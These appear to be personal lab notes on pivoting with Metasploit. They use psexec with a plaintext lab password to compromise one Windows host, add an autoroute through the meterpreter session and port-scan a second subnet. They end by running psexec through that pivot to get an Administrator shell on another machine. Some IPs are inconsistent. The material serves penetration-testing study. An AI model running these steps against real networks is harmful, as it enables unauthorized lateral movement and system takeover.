--Lab Setup--

Windows 10 Machine: 
Logged as "fcastle"
2 Network Interface Cards, IPs:
- 192.168.202.4
- 10.10.10.3 


Windows 10 Machine (Fsecurity One):
Logged as "pparker"
1 Network Interface Card, IP:
- 10.10.10.4


Windows 2016 Machine:
Logged as "Administrator"
2 Network Interface Cards, IPs:
- 192.168.202.5
- 10.10.10.5


Kali Machine (This machine):
1 Network Interface Card, IP:
- 192.168.202.6


The idea is that only "Fcastle" Windows 10 machine can reach "pparker" Windows 10 machine, but NOT Kali. So we will use Pivoting to communicate with pparker machine by means of fcastle machine.

On Kali we send the psexec exploit again
msf > use exploit/windows/smb/psexec
msf > set RHOSTS 192.168.2.4
msf > set SMBDomain marvel
msf > set SMBPass Kawaninjazx6r
msf > set SMBUser fcastle
msf > set target 2
msf > run

Once we get the session back
msf > run autoroute -p -> No routes added at this point

Autorun module enables other modules to 'pivot' through a compromised 
host when connecting to the named NETWORK and SUBMASK, via the meterpreter session open, so what we want
is that whenever we want to go to 10.10.10.0/24 networks, proxy that connection through the meterpreter session
with the compromised machine (fcastle windows 10, as this machine can communicate with pparker win 10 machine which is is on 10.10.10.0/24 network)
msf > run autoroute -s 10.10.10.0/24
 
We can see the route indeed added:
msf > bg
msf5 exploit(windows/smb/psexec) > route
IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 2

In real life, to know if a machine is multi-home (has 2 network interfaces), is simply checking its network-related config. Example by using this compromised fcastle machine:
msf > shell
C:\> route print
C:\> arp -a
C:\> netstat
C:\> ipconfig
In all above, you will see 2 or 3 or more networm segments, meaninig it is multi-home. Also check the interfaces (ipconfig).


Now that we have pivot access to pparker computer network, we can scan ports open for that computer. Background the open session in meterpreter:
msf > bg
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.4 -> pparker Win 10 PC
msf > set PORTS 1-1024
msf > run

Scanning through pivoting is super slow, so be patient.

Once we have the ports, we can also use pivoting for Command Shell access through SMB.
msf > exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 exploit(windows/smb/psexec) > set LPORT 5555
LPORT => 5555
msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf5 exploit(windows/smb/psexec) > run

We will be pivoting through the compromised fcastle machine to gain shell access to pparker machine (10.10.10.4) as an Administrator user
